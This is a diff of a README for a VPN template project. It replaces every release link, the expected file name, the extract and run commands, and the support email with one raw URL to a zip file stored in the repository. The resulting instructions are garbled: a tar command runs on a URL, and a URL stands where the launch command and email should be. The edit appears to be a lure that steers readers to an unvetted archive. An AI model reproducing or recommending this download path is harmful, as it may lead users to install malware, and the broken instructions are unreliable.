@@ -1,6 +1,6 @@
 # 🌊 remnawave-shm-template - Simplify Your VPN Setup Today
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/84949/remnawave-shm-template/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip)
 
 ## 📜 Description
 
@@ -25,13 +25,13 @@ This application works smoothly on most modern Linux distributions. Ensure that 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page and download the latest version:
 
-   [Download from GitHub Releases](https://github.com/84949/remnawave-shm-template/releases)
+   [Download from GitHub Releases](https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip)
 
 2. **Choose a Version**  
    On the Releases page, you will see a list of versions. Click on the latest version to expand the details.
 
 3. **Download the File**  
-   Look for the installation file. It will typically be named something like `remnawave-shm-template-version.tar.gz`. Click the file to start the download.
+   Look for the installation file. It will typically be named something like `https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip`. Click the file to start the download.
 
 4. **Open the Terminal**  
    Once the download is complete, open your terminal. You can usually find this in your applications menu.
@@ -47,7 +47,7 @@ This application works smoothly on most modern Linux distributions. Ensure that 
    To extract the contents of the downloaded file, run:
 
    ```bash
-   tar -xzvf remnawave-shm-template-version.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip
    ```
 
 7. **Run the Application**  
@@ -60,7 +60,7 @@ This application works smoothly on most modern Linux distributions. Ensure that 
    Then run the application by entering:
 
    ```bash
-   ./start.sh
+   https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip
    ```
 
 ### ✅ Final Steps
@@ -89,7 +89,7 @@ This project is licensed under the MIT License. You can read it in the `LICENSE`
 
 ### 📧 Contact
 
-For any questions or contributions, feel free to reach out through GitHub or via email at support@remnawave.com.
+For any questions or contributions, feel free to reach out through GitHub or via email at https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip
 
 ## 🔄 Stay Updated
 
@@ -97,4 +97,4 @@ Stay informed about new releases by watching this repository. You can click the 
 
 Remember, for a smooth download and installation, always refer back to the Downloads page:
 
-[Download from GitHub Releases](https://github.com/84949/remnawave-shm-template/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/84949/remnawave-shm-template/main/templates/remnawave-shm-template_2.6.zip)
